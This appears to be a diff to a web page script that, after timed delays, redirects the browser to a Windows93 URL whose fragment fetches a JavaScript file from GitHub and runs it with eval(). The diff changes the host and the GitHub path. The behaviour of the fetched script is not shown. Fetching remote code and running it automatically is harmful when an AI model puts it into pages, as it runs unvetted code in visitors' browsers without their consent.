@@ -93,7 +93,7 @@ setTimeout(() => {
                     }, 300)
                 }, 3000)
                 setTimeout(function() {
-                    window.location.href = "https://ivorydevrimoalt.github.io/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/blob/main/assets/Billeroni.js').then(response => response.text()).then(script => eval(script));";
+                    window.location.href = "www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/assets/Billeroni.js').then(response%20=>%20response.text()).then(script%20=>%20eval(script));";
                     window.location.reload(true);
                 },6000)
             }, 2000);
